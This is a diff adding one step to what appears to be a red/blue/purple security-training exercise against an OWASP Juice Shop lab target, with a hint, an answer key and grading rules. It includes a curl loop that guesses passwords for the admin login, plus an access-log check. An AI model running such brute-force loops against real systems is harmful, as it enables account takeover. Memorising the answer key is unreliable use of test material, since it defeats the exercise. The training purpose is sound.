@@ -277,3 +277,36 @@ steps:
           - "prevention (alg whitelist) 인지 못함"
           - "*OWASP A01* + *CWE-639* 매핑 누락"
     target_vm: attacker
+
+  # ============================================================
+  # STEP 3 — R/B/P 종합 (Auth + IDOR + JWT)
+  # ============================================================
+  - order: 3
+    instruction: |
+      ## 🎯 MISSION (R/B/P 종합)
+
+      Red = hydra brute + JWT alg=none + IDOR / Blue = rate limit + access.log /
+      Purple = JWT alg whitelist routine.
+
+      ## 💻
+      ```bash
+      ssh 6v6-attacker 'for p in 123 admin user; do curl -s -o /dev/null -w "%{http_code}\n" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$p\"}" -H "Content-Type: application/json" -H "Host: juice.6v6.lab" http://10.20.30.1/rest/user/login; done'
+      ssh 6v6-web "sudo tail -10 /var/log/apache2/access.log | grep '/rest/user/login' | head -3"
+      echo "Coverage: brute + alg=none + IDOR → rate limit + JWT alg whitelist + ACL"
+      ```
+    hint: 'curl brute + access.log'
+    category: rbp_integration
+    points: 4
+    answer: |
+      ssh 6v6-attacker 'for p in 123 admin; do curl -s -o /dev/null -w "%{http_code}\n" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$p\"}" -H "Content-Type: application/json" -H "Host: juice.6v6.lab" http://10.20.30.1/rest/user/login; done'
+      echo "Coverage: brute + alg whitelist + ACL"
+    answer_detail: Auth R/B/P
+    verify:
+      type: output_contains
+      expect: 'Coverage'
+      field: stdout
+      semantic:
+        intent: Auth R/B/P
+        success_criteria: [brute, Coverage]
+        acceptable_methods: ["**[OSS] curl loop**"]
+    target_vm: attacker
